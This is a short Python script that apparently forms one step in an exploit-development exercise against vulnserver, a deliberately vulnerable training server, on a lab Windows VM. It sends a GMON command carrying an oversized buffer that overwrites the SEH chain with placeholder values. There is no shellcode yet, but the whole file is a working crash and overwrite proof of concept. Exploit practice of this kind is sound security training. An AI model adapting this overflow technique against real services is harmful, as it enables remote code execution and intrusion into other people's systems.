#!/usr/bin/python

import socket
import os
import sys

host = '192.168.100.118'        # Windows VM
port = 9999                     # vulnserver port

nSeh = 'BBBB'
Seh = 'CCCC'

buffer = 'A' * 3494
buffer += nSeh
buffer += Seh
buffer += 'C' * (5112 - len(buffer))



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()
